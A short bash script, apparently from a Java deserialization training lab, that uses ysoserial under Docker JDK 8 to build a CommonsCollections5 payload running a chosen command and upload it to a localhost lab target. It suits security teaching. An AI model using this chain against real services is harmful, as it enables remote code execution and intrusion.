#!/bin/bash
# class18 — CC5链 (CommonsCollections5)
# 靶场: /class18/upload
# 注意: JDK 9+ 将 BadAttributeValueExpException.val 从 Object 改为 String，
#       导致无法通过反射将 TiedMapEntry 赋给 val 字段。
#       因此需要在 JDK 8 环境中生成。
cd "$(dirname "$0")"
CMD="${1:-id}"

# 将 ysoserial.jar 复制到 Docker 容器
docker cp ../../lib/ysoserial.jar javaserial-lab:/tmp/ysoserial.jar 2>/dev/null

# 在 Docker JDK 8 中生成
docker exec javaserial-lab bash -c "
  java -jar /tmp/ysoserial.jar CommonsCollections5 '$CMD' > /tmp/class18.ser 2>/dev/null
" 2>/dev/null

docker cp javaserial-lab:/tmp/class18.ser ../../class18.ser 2>/dev/null
docker exec javaserial-lab rm -f /tmp/class18.ser /tmp/ysoserial.jar 2>/dev/null

if [ -s ../../class18.ser ]; then
  echo "✅ 已生成: class18.ser (命令: $CMD, 使用 Docker JDK 8)"
else
  echo "❌ 生成失败 — CC5 需要 JDK 8 环境，请检查 Docker 是否运行"
fi
echo "🎯 上传到 http://localhost:81/class18/"
